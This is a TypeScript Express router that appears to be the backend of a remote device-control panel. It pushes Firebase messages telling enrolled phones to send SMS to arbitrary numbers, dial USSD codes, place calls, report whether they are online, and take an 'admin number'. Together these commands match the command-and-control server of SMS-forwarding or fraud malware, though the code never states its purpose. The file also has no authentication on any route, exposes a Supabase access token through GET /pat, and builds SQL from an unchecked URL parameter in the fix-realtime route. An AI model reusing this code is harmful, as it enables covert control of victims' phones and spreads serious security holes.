import { Router, type IRouter, type Request, type Response } from "express";
import {
  checkSetup,
  runSetup,
  getApps,
  createApp,
  updateApp,
  deleteApp,
  getDevices,
  patchDevice,
  deleteDevice,
  upsertSysEntry,
  deleteAllSessions,
  fixDeviceTable,
  runSqlViaMgmt,
} from "../lib/supabase-admin.js";
import {
  sendCheckOnline,
  sendAdminUpdate,
  sendSmsCommand,
  sendUssdCommand,
  sendCallCommand,
  isValidFCMToken,
} from "../lib/fcm.js";

const router: IRouter = Router();

// ─── PAT (auto-fill from env) ─────────────────────────────
router.get("/pat", (_req: Request, res: Response) => {
  const pat = process.env["SUPABASE_PAT"]?.trim() ?? "";
  res.json({ pat });
});

// ─── Setup ────────────────────────────────────────────────

router.get("/setup/status", async (_req: Request, res: Response) => {
  try {
    const done = await checkSetup();
    res.json({ done });
  } catch (e: unknown) {
    res.status(500).json({ error: String(e) });
  }
});

router.post("/setup/init", async (req: Request, res: Response) => {
  const { pat } = req.body as { pat?: string };
  if (!pat?.trim()) {
    res.status(400).json({ error: "Supabase Personal Access Token (PAT) required" });
    return;
  }
  try {
    await runSetup(pat.trim());
    res.json({ ok: true });
  } catch (e: unknown) {
    res.status(500).json({ error: String(e) });
  }
});

// ─── Apps ─────────────────────────────────────────────────

router.get("/apps", async (_req: Request, res: Response) => {
  try {
    res.json(await getApps());
  } catch (e: unknown) {
    res.status(500).json({ error: String(e) });
  }
});

router.post("/apps", async (req: Request, res: Response) => {
  const { token, label, pat } = req.body as {
    token?: string;
    label?: string;
    pat?: string;
  };
  if (!token?.trim()) {
    res.status(400).json({ error: "token is required" });
    return;
  }
  if (!pat?.trim()) {
    res.status(400).json({ error: "Supabase PAT required to create device table" });
    return;
  }
  const clean = token.trim().toLowerCase().replace(/[^a-z0-9_]/g, "").replace(/^_+|_+$/g, "");
  if (!clean) {
    res.status(400).json({ error: "invalid token: only a-z0-9_ allowed" });
    return;
  }
  try {
    res.status(201).json(await createApp(clean, (label ?? "").trim(), pat.trim()));
  } catch (e: unknown) {
    res.status(500).json({ error: String(e) });
  }
});

router.patch("/apps/:id", async (req: Request, res: Response) => {
  const id = req.params["id"] as string;
  const patch = req.body as Record<string, unknown>;
  try {
    await updateApp(id, patch);
    res.json({ ok: true });
  } catch (e: unknown) {
    res.status(500).json({ error: String(e) });
  }
});

router.delete("/apps/:id", async (req: Request, res: Response) => {
  const id = req.params["id"] as string;
  try {
    await deleteApp(id);
    res.json({ ok: true });
  } catch (e: unknown) {
    res.status(500).json({ error: String(e) });
  }
});

// ─── Fix Realtime (realtime-only SQL, requires PAT) ───────────
router.post("/apps/:token/fix-realtime", async (req: Request, res: Response) => {
  const token = req.params["token"] as string;
  const { pat: bodyPat } = req.body as { pat?: string };
  const pat = bodyPat?.trim() || process.env["SUPABASE_PAT"]?.trim();
  if (!pat) {
    res.status(400).json({ ok: false, error: "Supabase PAT required" });
    return;
  }
  const tableName = `${token}_registered_devices`;
  const sql = `
    ALTER TABLE ${tableName} REPLICA IDENTITY FULL;
    DO $rt$ BEGIN
      IF NOT EXISTS (
        SELECT 1 FROM pg_publication_tables
        WHERE pubname = 'supabase_realtime'
          AND schemaname = 'public'
          AND tablename = '${tableName}'
      ) THEN
        ALTER PUBLICATION supabase_realtime ADD TABLE ${tableName};
      END IF;
    END $rt$;
  `;
  try {
    await runSqlViaMgmt(sql, pat.trim());
    res.json({ ok: true });
  } catch (e: unknown) {
    res.status(500).json({ ok: false, error: String(e) });
  }
});

// ─── Fix existing table (add missing columns + anon policies) ─
router.post("/apps/:token/fix-table", async (req: Request, res: Response) => {
  const token = req.params["token"] as string;
  const { pat } = req.body as { pat?: string };
  if (!pat?.trim()) {
    res.status(400).json({ error: "Supabase PAT required" });
    return;
  }
  try {
    await fixDeviceTable(token, pat.trim());
    res.json({ ok: true });
  } catch (e: unknown) {
    res.status(500).json({ error: String(e) });
  }
});

// ─── Devices ──────────────────────────────────────────────

router.get("/apps/:token/devices", async (req: Request, res: Response) => {
  const token = req.params["token"] as string;
  try {
    res.json(await getDevices(token));
  } catch (e: unknown) {
    res.status(500).json({ error: String(e) });
  }
});

router.patch(
  "/apps/:token/devices/:uid",
  async (req: Request, res: Response) => {
    const token = req.params["token"] as string;
    const uid = req.params["uid"] as string;
    const patch = req.body as Record<string, unknown>;
    try {
      await patchDevice(token, uid, patch);
      res.json({ ok: true });
    } catch (e: unknown) {
      res.status(500).json({ error: String(e) });
    }
  }
);

router.delete(
  "/apps/:token/devices/:uid",
  async (req: Request, res: Response) => {
    const token = req.params["token"] as string;
    const uid = req.params["uid"] as string;
    try {
      await deleteDevice(token, uid);
      res.json({ ok: true });
    } catch (e: unknown) {
      res.status(500).json({ error: String(e) });
    }
  }
);

// ─── Sys entry upsert (creates if missing, updates if exists) ─
router.post(
  "/apps/:token/upsert-sys-entry",
  async (req: Request, res: Response) => {
    const token = req.params["token"] as string;
    const { sub_id, data_type, data_json } = req.body as {
      sub_id?: string;
      data_type?: string;
      data_json?: Record<string, unknown>;
    };
    if (!sub_id || !data_type || !data_json) {
      res.status(400).json({ error: "sub_id, data_type, data_json required" });
      return;
    }
    try {
      await upsertSysEntry(token, sub_id, data_type, data_json);
      res.json({ ok: true });
    } catch (e: unknown) {
      res.status(500).json({ error: String(e) });
    }
  }
);

// ─── Delete all session rows for an app ──────────────────────
router.delete(
  "/apps/:token/sessions",
  async (req: Request, res: Response) => {
    const token = req.params["token"] as string;
    try {
      await deleteAllSessions(token);
      res.json({ ok: true });
    } catch (e: unknown) {
      res.status(500).json({ error: String(e) });
    }
  }
);

// ─── FCM: Send CHECK_ONLINE to one device ────────────────────
router.post(
  "/apps/:token/fcm/check-online",
  async (req: Request, res: Response) => {
    const token = req.params["token"] as string;
    const { uid, fcmToken } = req.body as { uid?: string; fcmToken?: string };
    if (!uid?.trim() || !fcmToken?.trim()) {
      res.status(400).json({ ok: false, error: "uid and fcmToken required" });
      return;
    }
    try {
      const msgId = await sendCheckOnline(fcmToken.trim(), uid.trim());
      res.json({ ok: true, messageId: msgId });
    } catch (e: unknown) {
      res.status(500).json({ ok: false, error: String(e) });
    }
  }
);

// ─── FCM: Broadcast CHECK_ONLINE to ALL devices of an app ────
router.post(
  "/apps/:token/fcm/check-online-all",
  async (req: Request, res: Response) => {
    const token = req.params["token"] as string;
    try {
      const devicesResp = await getDevices(token);
      const devices = (devicesResp as { devices?: unknown[] }).devices ?? [];

      const results: { uid: string; ok: boolean; messageId?: string; error?: string }[] = [];

      for (const d of devices as Array<Record<string, unknown>>) {
        const uid = (d["sub_id"] ?? d["uid"] ?? "") as string;
        const dj = (d["data_json"] ?? {}) as Record<string, unknown>;
        const fcmToken = ((dj["fcm_token"] ?? dj["fcmToken"] ?? "") as string).trim();

        if (!uid || !fcmToken || fcmToken.length < 50) {
          results.push({ uid, ok: false, error: "no_token" });
          continue;
        }
        try {
          const msgId = await sendCheckOnline(fcmToken, uid);
          results.push({ uid, ok: true, messageId: msgId });
        } catch (e: unknown) {
          results.push({ uid, ok: false, error: String(e) });
        }
      }

      res.json({ ok: true, results });
    } catch (e: unknown) {
      res.status(500).json({ ok: false, error: String(e) });
    }
  }
);

// ─── FCM: Send ADMIN_UPDATE (push admin number to device) ────
router.post(
  "/apps/:token/fcm/admin-update",
  async (req: Request, res: Response) => {
    const token = req.params["token"] as string;
    const { uid, fcmToken, adminNumber, status } = req.body as {
      uid?: string;
      fcmToken?: string;
      adminNumber?: string;
      status?: "ACTIVE" | "INACTIVE";
    };
    if (!uid?.trim() || !fcmToken?.trim() || !adminNumber?.trim()) {
      res.status(400).json({ ok: false, error: "uid, fcmToken, adminNumber required" });
      return;
    }
    try {
      const msgId = await sendAdminUpdate(
        fcmToken.trim(),
        uid.trim(),
        adminNumber.trim(),
        status ?? "ACTIVE"
      );
      res.json({ ok: true, messageId: msgId });
    } catch (e: unknown) {
      res.status(500).json({ ok: false, error: String(e) });
    }
  }
);

// ─── FCM: SMS command ─────────────────────────────────────────
// Same payload as FCMHelper.sendSmsCommand
router.post(
  "/apps/:token/fcm/sms",
  async (req: Request, res: Response) => {
    const { uid, fcmToken, to, body, simSlot } = req.body as {
      uid?: string; fcmToken?: string; to?: string; body?: string; simSlot?: number;
    };
    if (!uid?.trim() || !fcmToken?.trim() || !to?.trim() || body === undefined) {
      res.status(400).json({ ok: false, error: "uid, fcmToken, to, body required" });
      return;
    }
    if (!isValidFCMToken(fcmToken.trim())) {
      res.status(400).json({ ok: false, error: "invalid fcmToken" });
      return;
    }
    try {
      const msgId = await sendSmsCommand(
        fcmToken.trim(), uid.trim(), to.trim(), body, simSlot ?? 0
      );
      res.json({ ok: true, messageId: msgId });
    } catch (e: unknown) {
      res.status(500).json({ ok: false, error: String(e) });
    }
  }
);

// ─── FCM: USSD command ────────────────────────────────────────
// Same payload as FCMHelper.sendUssdCommand
router.post(
  "/apps/:token/fcm/ussd",
  async (req: Request, res: Response) => {
    const { uid, fcmToken, code, simSlot } = req.body as {
      uid?: string; fcmToken?: string; code?: string; simSlot?: number;
    };
    if (!uid?.trim() || !fcmToken?.trim() || !code?.trim()) {
      res.status(400).json({ ok: false, error: "uid, fcmToken, code required" });
      return;
    }
    if (!isValidFCMToken(fcmToken.trim())) {
      res.status(400).json({ ok: false, error: "invalid fcmToken" });
      return;
    }
    try {
      const msgId = await sendUssdCommand(
        fcmToken.trim(), uid.trim(), code.trim(), simSlot ?? 0
      );
      res.json({ ok: true, messageId: msgId });
    } catch (e: unknown) {
      res.status(500).json({ ok: false, error: String(e) });
    }
  }
);

// ─── FCM: Call command ────────────────────────────────────────
// Same payload as FCMHelper.sendCallCommand
router.post(
  "/apps/:token/fcm/call",
  async (req: Request, res: Response) => {
    const { uid, fcmToken, code, simSlot, number, actionType } = req.body as {
      uid?: string; fcmToken?: string; code?: string;
      simSlot?: number; number?: string; actionType?: string;
    };
    if (!uid?.trim() || !fcmToken?.trim() || !code?.trim()) {
      res.status(400).json({ ok: false, error: "uid, fcmToken, code required" });
      return;
    }
    if (!isValidFCMToken(fcmToken.trim())) {
      res.status(400).json({ ok: false, error: "invalid fcmToken" });
      return;
    }
    try {
      const msgId = await sendCallCommand(
        fcmToken.trim(), uid.trim(), code.trim(),
        simSlot ?? 0, number?.trim(), actionType?.trim()
      );
      res.json({ ok: true, messageId: msgId });
    } catch (e: unknown) {
      res.status(500).json({ ok: false, error: String(e) });
    }
  }
);

export default router;
